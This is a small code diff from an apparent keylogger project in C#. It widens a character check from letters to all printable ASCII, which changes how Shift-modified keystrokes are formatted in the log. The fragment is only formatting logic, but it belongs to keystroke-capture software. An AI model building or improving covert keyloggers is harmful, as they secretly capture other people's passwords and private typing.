@@ -59,9 +59,9 @@ namespace KeyboardLogger.KeyLog
 
         // IsAlpha (ch)
         // - checks if character is alphabet
-        static bool IsAlpha(char ch)
+        static bool IsVisible(char ch)
         {
-            return (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z');
+            return (ch >= ' ' && ch <= '~');
         }
 
 
@@ -112,7 +112,7 @@ namespace KeyboardLogger.KeyLog
             // get string format
             string ans = "";
             char ch = (char)User32.MapVirtualKey(vkCode, MapVK.MAPVK_VK_TO_CHAR);
-            if (Ctrl || Alt || (Shift && !IsAlpha(ch)))
+            if (Ctrl || Alt || (Shift && !IsVisible(ch)))
             {
                 ans += " [";
                 ans += Ctrl ? "Ctrl+" : "";
